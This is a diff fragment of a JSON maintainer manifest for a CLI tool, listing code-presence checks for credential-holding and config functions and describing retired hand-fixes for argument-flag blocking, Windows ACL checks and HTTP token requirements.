+     "contains": "credkit.FlagValues(args, \"--home\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "credkit.FlagValues(args, \"--config\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "func HoldStartupFiles() {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/avanan_config.go",
+     "contains": "func HoldFiles(paths []string) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/avanan_config_hold.go",
+     "contains": "func HoldTOMLValues(data []byte, isSetting func(key string) bool) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/avanan_config_hold.go",
+     "contains": "func tomlUnescape(s string) string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/avanan_config_hold.go",
+     "contains": "func HeldHeaderComponents(v string) []string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/avanan_config_hold.go",
+     "contains": "func AtomicWriteCheckedFile(path string, data []byte, fileMode, dirMode os.FileMode) error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "holdConfigBytes(data)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "HoldCredentials(cfg)",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/avanan_review_classes_test.go",
+     "contains": "func TestStartupSelectionReadsPastAFlagValueDoubleDash(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/avanan_review_classes_test.go",
+     "contains": "func TestMalformedConfigHoldsDecodedTOMLEscapes(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/avanan_review_classes_test.go",
+     "contains": "func TestHeaderPartsHaveNoShapeFilter(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  }
+ ],
+ "retired": [
+  {
+   "id": "mcp-filesystem-destination-gate",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0 builds a per-command blocked set (blockedDestinationFlags, blockedInputFlags, root control-plane flags), removes those flags from each tool's schema, refuses any undeclared argument name (so \"db=/path\" is refused) and skips '=' names in cliArgsFromMCP."
+  },
+  {
+   "id": "mcp-argv-value-joined",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #4647: every value-carrying branch of cliArgsFromMCP joins the value to its flag (--k=v, one element per list item), and the press generates TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag."
+  },
+  {
+   "id": "mcp-recipe-argv-not-flag-like",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #5045 (4.33.6): a recipe positional that looks like a flag is placed after --, so it cannot set another flag."
+  },
+  {
+   "id": "windows-sddl-alias-sid-compare",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #5041 (4.33.6): trustees are resolved to SIDs (LA through the OS) and compared by SID; the press generates the alias tests."
+  },
+  {
+   "id": "windows-null-dacl-behind-flags",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #5041 (4.33.6): the DACL section's flags and ACE list are framed (daclFlagsRe, aceListRe), so a NULL DACL behind flags is refused."
+  },
+  {
+   "id": "interim-http-security-note-2026-10-22",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: The note paused HTTP mode until a reprint because the build served HTTP with no token. Press 4.34.0 HTTP mode refuses to start without <PREFIX>_MCP_HTTP_TOKEN, answers 401 without the right bearer, binds 127.0.0.1 by default and refuses a non-loopback address without TLS; onboard.py now writes HTTP guidance that follows the binary (cc-skills #14) and never writes this note, so the entry would fail on every re-onboard."
+  },
+  {
+   "id": "mcp-file-flags-refused",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0's cobratree mirror derives one blocked set per command (destination, input, mcp:write-flags, mcp:read-flags and root control-plane flags), leaves those flags out of the tool schema and refuses them, and any undeclared argument, by name."
   }
  ]
 }
